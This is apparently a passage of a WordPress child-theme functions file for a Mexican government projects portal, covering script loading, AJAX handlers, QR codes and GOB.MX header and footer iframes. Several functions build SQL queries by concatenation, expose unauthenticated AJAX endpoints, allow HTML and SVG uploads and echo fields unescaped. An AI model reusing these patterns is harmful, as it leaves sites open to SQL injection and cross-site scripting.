        wp_enqueue_style('gallerytheme', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/theme/css/style.css', array(), '1.0.0', 'all');
        wp_enqueue_style('galleryblock', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/mobirise3-blocks-plugin/css/style.css', array(), '1.0.0', 'all');
        wp_enqueue_style('gallery', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/mobirise-gallery/style.css', array(), '1.0.0', 'all');

        wp_enqueue_script('gallerytether', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/tether/tether.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('galleryscroll', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/smooth-scroll/SmoothScroll.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('gallerytouch', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/touchSwipe/jquery.touchSwipe.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('gallerymasory', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/masonry/masonry.pkgd.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('galleryimagesloaded', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/imagesloaded/imagesloaded.pkgd.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('gallerytheme', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/theme/js/script.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('galleryblock', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/mobirise3-blocks-plugin/js/script.js', array( 'jquery' ), '1.0.0', true);

        wp_enqueue_script('my-great-script', get_template_directory_uri() . '/js/bco-js.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('my-great-script2', get_template_directory_uri() . '/js/bco-ini.js', array( 'jquery' ), '1.0.0', true);        
        wp_enqueue_style('bootstrap', get_stylesheet_directory_uri() . '/assets/bootstrap-3.3.7/css/bootstrap.min.css');
        wp_enqueue_script('my-bootstrap-js', get_stylesheet_directory_uri() . '/assets/bootstrap-3.3.7/js/bootstrap.min.js');
        

        wp_enqueue_script('table-export-jspdf', get_stylesheet_directory_uri() . '/assets/table-export/libs/jsPDF/jspdf.min.js');
        wp_enqueue_script('table-export-jspdf-autotable', get_stylesheet_directory_uri() . '/assets/table-export/libs/jsPDF-AutoTable/jspdf.plugin.autotable.js');
        wp_enqueue_script('table-export-xlsx', get_stylesheet_directory_uri() . '/assets/table-export/libs/js-xlsx/xlsx.core.min.js');
        wp_enqueue_script('table-export', get_stylesheet_directory_uri() . '/assets/table-export/tableExport.min.js');


    }

}
add_action('wp_enqueue_scripts', 'theme_scripts');

// REMOVE POST META BOXES
function remove_my_post_metaboxes()
{
    // Under the Editor
    /*remove_meta_box( 'authordiv','post','normal' ); // Author Metabox
    remove_meta_box( 'commentstatusdiv','post','normal' ); // Comments Status Metabox
    remove_meta_box( 'commentsdiv','post','normal' ); // Comments Metabox
    remove_meta_box( 'postcustom','post','normal' ); // Custom Fields Metabox
    remove_meta_box( 'postexcerpt','post','normal' ); // Excerpt Metabox
    remove_meta_box( 'revisionsdiv','post','normal' ); // Revisions Metabox
    remove_meta_box( 'slugdiv','post','normal' ); // Slug Metabox
    remove_meta_box( 'trackbacksdiv','post','normal' ); // Trackback Metabox*/
    // Sidebar Options
    remove_meta_box('subsector_proyectodiv', 'proyecto_inversion', 'normal'); // Subsectores Metabox
    remove_meta_box('tagsdiv-activo_proyecto', 'proyecto_inversion', 'normal'); // Activos Metabox
    remove_meta_box('tagsdiv-accion_proyecto', 'proyecto_inversion', 'normal'); // Accion Metabox
    remove_meta_box('tagsdiv-autoridad_responsable', 'proyecto_inversion', 'normal'); // Autoridades Metabox
    remove_meta_box('tagsdiv-estados_republica', 'proyecto_inversion', 'normal'); // Estados Metabox
    remove_meta_box('tagsdiv-region_geografica', 'proyecto_inversion', 'normal'); // Regio Geo Metabox
    remove_meta_box('tagsdiv-tipo_inversion_proyecto', 'proyecto_inversion', 'normal'); // Tipo Inversion Metabox
    remove_meta_box('tagsdiv-fuente_fondeo_proyecto', 'proyecto_inversion', 'normal'); // Fondeo Metabox
    remove_meta_box('tagsdiv-etapa_proyecto', 'proyecto_inversion', 'normal'); // Etapas Metabox
    remove_meta_box('tagsdiv-subetapa_proyecto', 'proyecto_inversion', 'normal'); // Subetapas Metabox
    remove_meta_box('tagsdiv-tipo_contrato_proyecto', 'proyecto_inversion', 'normal'); // Tipos Contrato Metabox
    remove_meta_box('tagsdiv-fuente_pago_proyecto', 'proyecto_inversion', 'normal'); // Fuente pago Metabox
    remove_meta_box('tagsdiv-origen_financiamiento_proyecto', 'proyecto_inversion', 'normal'); // Origen Financiamiento Metabox
    remove_meta_box('tagsdiv-plazos_proyecto', 'proyecto_inversion', 'normal'); // Plazos Metabox
    remove_meta_box('sector_proyectodiv', 'proyecto_inversion', 'normal'); // Sector Metabox
    remove_meta_box('tagsdiv-mondea_proyecto', 'proyecto_inversion', 'normal'); // Moneda Metabox
    remove_meta_box('categoria_macroproyectodiv', 'proyecto_inversion', 'normal'); // Moneda Metabox
    remove_meta_box('authordiv', 'proyecto_inversion', 'normal'); // Autor
}
add_action('admin_menu', 'remove_my_post_metaboxes');


// Added this function to load two JS to Admin in Currency Field
function my_admin_scripts()
{
    wp_enqueue_script('my-great-script', get_template_directory_uri() . '/js/bco-js.js', array( 'jquery' ), version_id(), true);
    wp_enqueue_script('my-great-script2', get_template_directory_uri() . '/js/bco-ini.js', array( 'jquery' ), version_id(), true);
}
add_action('admin_enqueue_scripts', 'my_admin_scripts');

function acf_load_color_field_choices($field)
{
    // reset choices
    $field['choices'] = array();

    $choices = array();
    $args = array(
        'post_type' => 'post'
    );
    $postchoices = new WP_Query($args);

    // explode the value so that each line is a new array piece
    $postchoices = explode("\n", $postchoices);

    // remove any unwanted white space
    $postchoices = array_map('trim', $postchoices);

    // loop through array and add to field 'choices'
    if (is_array($postchoices)) {
        foreach ($postchoices as $postchoices) {
            $field['choices'][ $postchoices ] = $postchoices;
        }
    }

    // return the field
    return $field;
}
add_filter('acf/load_field/name=fields[field_57f680e43e112][choices]', 'acf_load_color_field_choices');

function acf_load_sample_field($field)
{
    $field['choices'] = get_post_type_values('sample_post_type');
    return $field;
}
add_filter('acf/load_field/name=sector_nvl1', 'acf_load_sample_field');

function get_post_type_values($post_type)
{
    ?>
    <style type="text/css">
        #acf-hidden {
            display: block;
        }
    </style>
    <script type="text/javascript">

        var $j = jQuery.noConflict();

        $j(function() {
            $j('#acf-field-sector_nvl1').on('change', function() {
                var selectedValue = this.value;

                var nomos_name = this.value;
                var jsonMimeType = "application/json;charset=UTF-8";

                type = 'POST';
                data = { 'parent_id': nomos_name, action : 'get_child_categories' };
                dataType = 'json';
                contentType = "application/json; charset=utf-8";
                processData = false;
                $j.post( ajaxurl, data, function(response) {
                    if( response ){
                        console.log(response);
                        var content = '';

                        var data = JSON.parse(response);
                        $j(data).each(function(key, value) {
                            content += '<option>' + value + '</option>';
                        });
                        //$j(content).appendTo("#subsector_nvl2");
                        $j("#subsector_nvl2").html(response);
                    }
                });
            });
        });
    </script>
    <?php

    $values = array();
    $parent = get_posts(array(
    'title' => 'Sectores',
    'post_type' => 'post'));
    $myparent = $parent[0]->ID;

    $defaults = array(
        'post_type' => 'post',
        'meta_query' => array(
            array(
                'key' => 'opcion_padre', // name of custom field
                'value' => '"'.$parent[0]->ID.'"', // matches exaclty "123", not just 123. This prevents a match for "1234"
                                                    //'title' => 'Energia',
                //'value' => '"'.$parent.'"',
                'compare' => 'LIKE'
            )
        )
    );

    $query = new WP_Query($defaults);

    if ($query->found_posts > 0) {
        foreach ($query->posts as $post) {
            $values[$post->ID ] = get_the_title($post->ID);
        }
    }
    return $values;
}

function get_child_sector()
{
    if (isset($_POST['parent_id'])) {
        $ID = json_decode($_POST['parent_id']);
        $type = $_POST['posttype'];
        $values = array();

        // args for the post type query
        $args = array(
            'post_type'      => '"'.$type.'"',
            'posts_per_page' => -1,
            'meta_query'     => array(
                array(
                    'key'     => 'opcion_padre', // name of custom field
                    'value'   => $ID, // matches exaclty "123", not just 123. This prevents a match for "1234"
                    'compare' => 'LIKE'
                )
            ),
            'order_by' => 'title'
        );

        $posts = get_children($args);

        foreach ($posts as $post) {
            $values[$post->ID ] = get_the_title($post->ID);
        }

        echo json_encode($values);
        //} //return $values;
    }

    die();
}
add_action('wp_ajax_get_child_subsector', 'get_child_sector');
add_action('wp_ajax_nopriv_get_child_subsector', 'get_child_sector');

function get_child_categories()
{
    wp_localize_script('nested_select', 'check_select', array(
        'ajax_url' => admin_url('admin-ajax.php')
    ));

    $choices= array();

    if ($_POST['parent_option'] != '') {
        $type = $_POST['post_type'];
        $parent = $_POST['parent_option'];
        $filter = array(
            'post_type'     => $type,
            'posts_per_page'=> -1,
            'meta_query' => array(
                array(
                    'key' => 'opcion_padre', // name of custom field
                    'value' => $parent, // matches exaclty "123", not just 123. This prevents a match for "1234"
                    'compare' => 'IN'
                )
            ),
            'order_by'      => 'title'
        );

        $posts = get_posts($filter);

        if ($posts) {
            foreach ($posts as $singlepost) {
                $choices[$singlepost->ID]=$singlepost->post_title;
            }
        }
    }
    echo json_encode($choices);

    wp_die();
}
add_action('wp_ajax_get_child_categories', 'get_child_categories');
add_action('wp_ajax_nopriv_get_child_categories', 'get_child_categories');

function acf_load_sample_field2($field)
{
    $field['choices'] = get_post_type_values2('sample_post_type');
    return $field;
}
add_filter('acf/load_field/name=subsector_nvl2', 'acf_load_sample_field2');

add_filter( 'upload_mimes', 'my_myme_types', 1, 1 );
function my_myme_types( $mime_types ) {
  $mime_types['svg'] = 'image/svg+xml';     // Adding .svg extension
  $mime_types['json'] = 'application/json'; // Adding .json extension
  
  //unset( $mime_types['xls'] );  // Remove .xls extension
  //unset( $mime_types['xlsx'] ); // Remove .xlsx extension
  
  return $mime_types;
}


function get_post_type_values2($post_type)
{
    $values = array();
    $myparent = get_field('sector_nvl1');
    echo "padre: ".$myparent;
    $defaults = array(
        'post_type' => 'post',
        'meta_query' => array(
            array(
                'key' => 'opcion_padre', // name of custom field
                'value' => '"'.$myparent.'"', // matches exaclty "123", not just 123. This prevents a match for "1234"
                                                    //'title' => 'Energia',
                'compare' => 'LIKE'
            )
        )
    );

    $query = new WP_Query($defaults);

    if ($query->found_posts > 0) {
        foreach ($query->posts as $post) {
            $values[get_the_title($post->ID)] = get_the_title($post->ID);
        }
    }

    return $values;
}

function get_value_notifications($table='', $get_campo='', $set_campo='', $value='', $post_id='57797'){
    global $wpdb;

    if($table == '')
        $table = 'postmeta';

    if($get_campo == '')
        $get_campo = 'meta_value';

    if($set_campo == '')
        $set_campo = 'meta_key';


    $data = $wpdb-> get_row('SELECT '.$get_campo.' FROM ' . $wpdb->prefix .$table.' WHERE post_id='.$post_id.' and '.$set_campo.'="'.$value.'"');    
    return $data -> $get_campo;
}

function promotor($entidad_regulatoria=0, $web='', $arreglo='', $area='', $contacto='', $email='', $lang){
    $uno = "Ir al sitio";
    $dos = "Arreglo institucional";
    $tres = "Entidad";
    $cuatro = "&Aacute;rea responsable";
    $quinto = "Contacto";
    $sexto = "Correo";    
    $titulo_entidad = get_the_title($entidad_regulatoria);
    $proyecto = get_the_title();
    if($lang=='en'){
        $uno = "Website";
        $dos = "Institutional Arrangement";
        $tres = "Entity";
        $cuatro = "Department";
        $quinto = "Contact";
        $sexto = "E-mail";        
        $titulo_entidad = get_the_title(pll_get_post($entidad_regulatoria,"en"));
        $proyecto = get_field('nombre_oficial_ingles');
    }
    $html = '
    <div class="row">
        <div class="col-md-4 hidden-xs">
            <div class="row">
                <!-- Imágenes -->
                <div class="col-md-7 col-md-offset-3 col-sm-offset-3 col-sm-6" style="padding-top:15px;">';
                $html .= get_the_post_thumbnail($entidad_regulatoria,'',array( 'class' => 'center-block'));
                $html .= '
                </div>
                <!-- Botones -->
                <div class="col-md-8 col-md-offset-2" style="padding-top:10px;">
                    <div class="row">
                        <div class="col-md-12 col-sm-10 col-sm-offset-1" style="padding-top:10px">';
                            if ( $web != '' ) { 
                                $html .='<a class="btn btn-primary btn-lg btn-sm btn-block" style="background-color: #008688; color:#fff" target="_blank" href="'.$web.'">'.$uno.'</a>';
                            }
                        $html .='
                        </div>
                        <div class="col-md-12 col-sm-10 col-sm-offset-1" style="padding-top:20px;">';
                            if ($arreglo != '' ) {
                                $html .='<a class="btn btn-primary btn-lg btn-sm btn-block" style="background-color: #008689; color:#fff" target="_blank" href="'.$arreglo.'">'.$dos.'</a>';
                            }
                        $html .= '
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="col-md-1 visible-lg" style="padding-top:15px;">
            <img src="/wp-content/themes/enfold-child/lineapromotor.png" class="img-fluid" alt="Responsive image">
        </div>
        <div class="col-md-7" id="idmovil" style="padding-top:20px;">
            <table class="table">                                        
                <!-- Entidad -->
                <tr>
                    <td>
                        <h5><strong>'.$tres.'</strong></h5>
                        '.$titulo_entidad.'
                    </td>
                </tr>
                <!-- ?rea responsable -->';
                if ($area != '' ) {
                    $html .='
                    <tr>
                        <td>
                            <h5><strong>'.$cuatro.'</strong></h5>
                            '.$area.'
                        </td>
                    </tr>';
                }
                $html .='
                <!-- Contacto -->';
                if ($contacto != '' ) {
                    $html .='
                    <tr>
                            <td>
                                <h5><strong>'.$quinto.'</strong></h5>
                                '.$contacto.'
                            </td>
                    </tr>';
                }
                $html .='
                <!-- Correo -->';
                if ($email != '' ) {
                    $html .='
                    <tr>
                        <td>
                            <h5><strong>'.$sexto.'</strong></h5>
                                <a href="mailto:'.$email.'?cc=proyectosmexico@banobras.gob.mx&Subject='.$proyecto.' ">'.$email.'</a>                                                            
                        </td>
                    </tr>';
                }
            $html .='
            </table>
            <!-- Botones moviles-->
            <div class="col-sm-12 visible-xs">
                <div class="row">
                    <div class="col-md-12 col-sm-12">';
                    if ($web != '' ) {
                        $html .= '<a class="btn btn-primary btn-lg btn-sm btn-block" style="background-color: #008688; color:#fff" target="_blank" href="'.$web.'">'.$uno.'</a>';
                    }
                    $htm .='
                    </div>
                    <div class="col-md-12 col-sm-12" style="padding-top:20px;">';

                    if ( $arreglo != '' ) {
                        $html .= '<a class="btn btn-primary btn-lg btn-sm btn-block" style="background-color: #008689; color:#fff" target="_blank" href="'.$arreglo.'">'.$dos.'</a>';
                    }
                    $html .='
                    </div>                                    
                </div>
            </div>
        </div>
    </div>';
    echo $html;                        
}

function php_qrcode($id,$texto){

    // Limpiar variable
    $id = preg_replace('/\D/', '', $id);

    //if(!empty($id) && !empty($texto)){
        require $_SERVER['DOCUMENT_ROOT'].'/observatorio/phpqrcode/qrlib.php';
        //Declaramos una carpeta temporal para guardar la imagenes generadas
        $dir = $_SERVER['DOCUMENT_ROOT'].'/wp-content/cache/tmp/resources/qrcode/';
        //Declaramos la ruta y nombre del archivo a generar
        $FileName = $dir.$id.'.png';
        //Parametros de Condiguraci?
        $tama = 150; //Tama? de Pixel
        $level = 'L'; //Precisi? Baja
        $framSize = 0; //Tama? en blanco
        $url_page = $texto;

        //Enviamos los parametros a la Funcion para generar coigo QR 
        QRcode::png($url_page, $FileName, $level, $tama, $framSize);
    //}
}

function parametrizable_txt($id, $id_menu=0, $lang){
    $Query  = "SELECT descripcion_es, descripcion_en FROM tbl_textos_pdf WHERE idtexto=".$id;
    if(!empty($id_menu))
        $Query .= " and id_menu=".$id_menu;
    $conn = new conexion();
    $conM = $conn->conexionMysql();
    $result = $conM->query($Query);
    $texto = "";
    while ($row = $result->fetch_assoc()) {
        $texto = $row['descripcion_es'];
        if($lang=='EN')
            $texto = $row['descripcion_en'];
    }
    return $texto;
}


$URL = $_SERVER['DOCUMENT_ROOT']."/observatorio/conexion/conexion.php";
include_once($URL);
include 'bmxt-project-cache.php';
include 'vehiculos-cache.php';
include 'archived-project-cache.php';
include 'random.php';
include 'sostenibilidad.php';
include 'funciones_exportpdf.php';
include 'random/exportpdf.php';
include 'random_en/exportpdf.php';
include 'vehiculo/exportpdf.php';
include 'vehiculo_en/exportpdf.php';
include 'api.php';


/**
 * Resolver URL para header.html / footer.html desde dos ubicaciones posibles:
 *  1) /wp-content/uploads/2025/09/{header|footer}.html
 *  2) /wp-content/themes/enfold-child/{header|footer}.html (mejor con get_stylesheet_directory)
 */
function gobmx_resolver_html_url( $tipo = 'header' ) {
    $tipo = $tipo === 'footer' ? 'footer' : 'header';

    // Ruta en uploads (año/mes fijos)
    $uploads = wp_upload_dir();
    $u_path  = trailingslashit( $uploads['basedir'] ) . '2025/09/' . $tipo . '.html';
    $u_url   = trailingslashit( $uploads['baseurl'] ) . '2025/09/' . $tipo . '.html';

    // Ruta en el tema hijo (no hardcodeamos carpeta)
    $t_path  = trailingslashit( get_stylesheet_directory() ) . $tipo . '.html';
    $t_url   = trailingslashit( get_stylesheet_directory_uri() ) . $tipo . '.html';

    // Prioridad: primero uploads, luego tema
    if ( file_exists( $u_path ) ) {
        return $u_url;
    }
    if ( file_exists( $t_path ) ) {
        return $t_url;
    }

    // Si no existe ninguno, devolvemos false para que no se inserte el iframe
    return false;
}

/* =========================================
 *  ** Presidencia Footer **
 * ========================================= */
function insertar_footer_presidencia() {
    $footer_src = gobmx_resolver_html_url('footer');
    if ( ! $footer_src ) {
        // Nada que insertar si no hay archivo disponible.
        return;
    }
    ?>
    <div class="iframe-container">
        <iframe src="<?php echo esc_url( $footer_src ); ?>" frameborder="0" style="width: 100%;" id="gobmx-footer-iframe"></iframe>
    </div>
    <?php
}
add_action('wp_footer', 'insertar_footer_presidencia', 100);

// Ajuste dinámico de altura del iframe del footer
function ajustar_footer_presidencia() {
    ?>
    <script>
        (function() {
            function resizeIframe(iframe) {
                try {
                    const doc = iframe.contentWindow && iframe.contentWindow.document;
                    if (!doc || !doc.body) return;
                    const newHeight = doc.body.scrollHeight;
                    if (newHeight && iframe.style.height !== newHeight + 'px') {
                        iframe.style.height = newHeight + 'px';
                    }
                } catch (e) {
                    // Si por alguna razón hay restricción de origen, evitamos romper la página
                    console.warn('No fue posible ajustar altura del footer:', e);
                }
            }

            document.addEventListener('DOMContentLoaded', function() {
                const iframe = document.getElementById('gobmx-footer-iframe');
                if (!iframe) return;

                iframe.setAttribute('scrolling','no');

                iframe.onload = function() { resizeIframe(iframe); };
                window.addEventListener('resize', function(){ resizeIframe(iframe); });

                // Intervalo periódico para casos donde el contenido cambia
                setInterval(function(){ resizeIframe(iframe); }, 500);
            });
        })();
    </script>
    <?php
}
add_action('wp_footer', 'ajustar_footer_presidencia');

/* =========================================
 *  ** Presidencia Header **
 * ========================================= */
function insertar_iframe_en_header_meta() {
    $header_src = gobmx_resolver_html_url('header');
    if ( ! $header_src ) {
        // No insertamos nada si no hay archivo disponible.
        return;
    }
    ?>
    <style>
        /* Recorte y posición del header del Gobierno de México */
        #header_meta iframe {
            clip-path: inset(12px 0 0 0);
            transform: translateY(-13px);
            margin-bottom: -11px;
            /* mantener consistente con el JS */
            height: 71.5px !important;   /*altura para no tapar el regresar a proyectos*/
            display: block !important;
        }

        /* Botón de accesibilidad fijo */
        #gobmx-accessibility-button {
            position: fixed !important;
            top: 10px !important;
            right: 10px !important;
            z-index: 9999 !important;
        }

        #header_meta { height: auto !important; overflow: visible !important; }
        #header_meta .container,
        #header_meta .row,
        #header_meta .col-md-12 { overflow: visible !important; }
        
        /* Ajuste del logo del gobierno dentro del iframe */
        #header_meta iframe .navbar-brand img.logos,
        #header_meta iframe .navbar .navbar-brand img {
            height: 35px !important; /* Altura optimizada para mejor visualización */
            width: auto !important;
        }
    </style>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            var headerMeta = document.getElementById('header_meta');
            if (!headerMeta) return;

            var iframe = document.createElement('iframe');
            iframe.src = <?php echo json_encode( esc_url( $header_src ) ); ?>;
            iframe.style.width = '100%';
            iframe.style.border = 'none';
            iframe.style.overflow = 'hidden';
            iframe.scrolling = 'no';

            function ajustarAlturaIframe() {
                // Altura fija solicitada
                iframe.style.height = '75px';
            }

            // Función para inyectar CSS en el iframe
            function inyectarCSSEnIframe() {
                try {
                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                    if (iframeDoc) {
                        // Crear o actualizar el estilo
                        let style = iframeDoc.getElementById('logo-custom-style');
                        if (!style) {
                            style = iframeDoc.createElement('style');
                            style.id = 'logo-custom-style';
                            iframeDoc.head.appendChild(style);
                        }
                        
                        // CSS para ajustar el logo
                        style.textContent = `
                            .navbar-brand img.logos,
                            .navbar .navbar-brand img {
                                height: 35px !important;
                                width: auto !important;
                            }
                        `;
                    }
                } catch (e) {
                    // Si hay restricciones de cross-origin, el CSS externo debería funcionar
                    console.log('No se puede inyectar CSS en iframe (cross-origin)');
                }
            }

            ajustarAlturaIframe();
            window.addEventListener('resize', ajustarAlturaIframe);

            // Intentar inyectar CSS cuando el iframe cargue
            iframe.onload = function() {
                ajustarAlturaIframe();
                inyectarCSSEnIframe();
            };

            headerMeta.insertBefore(iframe, headerMeta.firstChild);
        });
    </script>
    <?php
}
add_action('wp_head', 'insertar_iframe_en_header_meta');

/* =========================================
 *  Botón de accesibilidad (sin cambios)
 * ========================================= */
function agregar_accesibilidad_header() {
    ?>
    <!-- CSS del botón -->
    <link rel="stylesheet" href="https://framework-gb.cdn.gob.mx/gm/accesibilidad/css/gobmx-accesibilidad.min.css" />
    <style>
        @media only screen and (max-device-width: 640px) {
            .menu-container .menu-btn { left: 2%; }
        }
    </style>
    <script>
        function cargarAccesibilidad() {
            if (typeof jQuery === 'undefined') {
                var script = document.createElement('script');
                script.src = 'https://code.jquery.com/jquery-3.6.0.min.js';
                script.integrity = 'sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=';
                script.crossOrigin = 'anonymous';
                script.onload = function() {
                    if (typeof $ === 'undefined' && typeof jQuery !== 'undefined') { window.$ = jQuery; }
                    cargarScriptAccesibilidad();
                };
                document.head.appendChild(script);
            } else {
                if (typeof $ === 'undefined' && typeof jQuery !== 'undefined') { window.$ = jQuery; }
                cargarScriptAccesibilidad();
            }
        }

        function cargarScriptAccesibilidad() {
            if (!document.getElementById('gobmx-accessibility-button')) {
                var accDiv = document.createElement('div');
                accDiv.id = 'gobmx-accessibility-button';
                accDiv.style.position = 'fixed';
                accDiv.style.top = '10px';
                accDiv.style.right = '10px';
                accDiv.style.zIndex = '9999';
                document.body.appendChild(accDiv);
            }

            var accScript = document.createElement('script');
            accScript.src = 'https://framework-gb.cdn.gob.mx/gm/accesibilidad/js/gobmx-accesibilidad.min.js';
            accScript.onload = function() {
                setTimeout(function() {
                    if (typeof $ === 'undefined' && typeof jQuery !== 'undefined') { window.$ = jQuery; }
                    if (typeof GobMXAccesibilidad === 'function') {
                        try { new GobMXAccesibilidad({ selector: '#gobmx-accessibility-button' }); }
                        catch (error) { console.error('Error al inicializar accesibilidad:', error); }
                    } else {
                        console.warn('GobMXAccesibilidad no está disponible');
                    }
                }, 100);
            };
            accScript.onerror = function() {
                console.error('Error al cargar gobmx-accesibilidad.min.js');
            };
            document.head.appendChild(accScript);
        }

        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', cargarAccesibilidad);
        } else {
            cargarAccesibilidad();
        }
    </script>
    <?php
}
add_action('wp_head', 'agregar_accesibilidad_header');


/* =========================================
 *  Restricción de subida de header/footer
 * ========================================= */
add_filter('wp_handle_upload_prefilter', function($file) {
    $allowed_files = ['footer.html', 'header.html'];

    // Verifica la extensión real del archivo , tmp, ruta temporal donde se carga el archivo
    $check = wp_check_filetype_and_ext($file['tmp_name'], $file['name']);

    // Solo restringe si es HTML; los demás tipos pasan sin tocar
    if ($check['ext'] === 'html') {
        $name = strtolower(basename($file['name'])); //convierte ascci en string
        if (!in_array($name, $allowed_files, true)) {
            $file['error'] = 'Solo puedes subir footer.html o header.html';
        }
    }

    return $file;
});

add_filter('upload_mimes', function($mimes) {
    $mimes['html'] = 'text/html';
    return $mimes;
});

/* Mini-nav GOB.MX solo en responsive (no toca tu header ni tu layout) */ function gobmx_mini_nav_responsive() { ?>
  <style>
    /* Mini-nav flotante (no empuja contenido) */
    #gobmx-mini-bar{
      position: fixed;
      left: 0; right: 0; bottom: 0;
      display: none; /* oculto por defecto */
      height: 48px;
      background: #611232 !important; /* color solicitado */
      color: #fff !important;
      z-index: 10050; /* por encima de la UI, debajo de modales altos */
      box-shadow: 0 -2px 8px rgba(0,0,0,.25);
      padding-bottom: env(safe-area-inset-bottom); /* iOS notch */
    }
    #gobmx-mini-bar .gobmx-mini-inner{
      max-width: 1200px;
      margin: 0 auto;
      height: 48px;
      display: flex;
      align-items: stretch;
      justify-content: space-around;
      gap: 8px;
      padding: 0 12px;
    }
    #gobmx-mini-bar a{
      flex: 1 1 0;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      padding: 0 10px;
      color: #fff !important;
      text-decoration: none;
      font: 500 14px/1 "Montserrat","Helvetica Neue",Arial,sans-serif;
      border-radius: 10px;
    }
    #gobmx-mini-bar a:hover, gobmx-mini-bar a:focus{
      background: rgba(255,255,255,.14);
      outline: 0;
    }
    /* Icono de búsqueda (fallback si no carga el set de íconos del framework) */
    #gobmx-mini-bar a[data-role="search"] i.icon-search::before{
      content: "🔍";
      display: inline-block;
      margin-right: .35rem;
      font-style: normal;
      line-height: 1;
    }
    /* Mostrar SOLO en responsive */
    @media (max-width: 992px){
      #gobmx-mini-bar{ display: block; }
    }
    @media (min-width: 993px){
      #gobmx-mini-bar{ display: none !important; }
    }
  </style>
  <nav id="gobmx-mini-bar" aria-label="Accesos rápidos GOBMX">
    <div class="gobmx-mini-inner">
      <a href="https://www.gob.mx/tramites" target="_parent" title="Ir a trámites del gobierno">Trámites</a>
      <a href="https://www.gob.mx/gobierno" target="_parent" title="Ir a gobierno">Gobierno</a>
      <a href="https://www.gob.mx/busqueda" target="_parent" title="Haz búsquedas en gobierno" data-role="search">
        <i class="icon-search" aria-hidden="true"></i>
        <span>Buscar</span>
      </a>
    </div>
  </nav> <?php }
add_action('wp_footer', 'gobmx_mini_nav_responsive', 99);
